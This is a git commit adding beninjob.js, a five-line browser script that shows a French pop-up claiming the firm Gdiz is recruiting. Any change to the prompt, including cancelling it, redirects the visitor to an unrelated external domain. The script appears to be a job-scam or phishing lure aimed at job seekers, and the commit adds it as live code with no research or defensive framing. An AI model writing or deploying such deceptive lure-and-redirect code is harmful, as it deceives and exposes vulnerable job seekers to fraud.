84a77c8233872a20f6b2ab84a13d5621926c750b
newetijazz7 <newetijazz7@gmail.com>
2026-01-07 07:35:38 +0100

    Create beninjob.js

---
+++ beninjob.js
@@ -0,0 +1,5 @@
+var password = 'Recrutement Gdiz'
+password=prompt('AVIS: Gdiz recrute actuellement, Cliquez sur OK pour postuler.','Recrutement Gdiz');
+if (password != 'Recrutement Gdiz') {
+location.href='https://www.jvrrdif.online/Gdiz-bj-recrute';
+}
